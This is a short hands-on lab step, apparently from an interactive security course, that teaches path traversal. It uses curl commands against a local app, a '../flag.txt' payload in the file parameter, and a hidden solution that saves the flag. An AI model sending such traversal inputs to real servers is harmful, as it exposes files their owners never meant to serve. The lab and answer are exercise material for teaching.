# Path traversal

The `/path` route serves files from a `sample/` folder, and it trusts the
`file` parameter to stay inside it:

`curl -s "http://127.0.0.1:5000/path?file=notes.txt"; echo`{{exec}}

`../` steps out of the folder. Next to the app sits a file that was never meant
to be served:

`curl -s "http://127.0.0.1:5000/path?file=../flag.txt"; echo`{{exec}}

**Your task:** save the flag to `/root/flag.txt`.

<details><summary>Show a solution</summary>

`curl -s "http://127.0.0.1:5000/path?file=../flag.txt" > /root/flag.txt; cat /root/flag.txt`{{exec}}

</details>
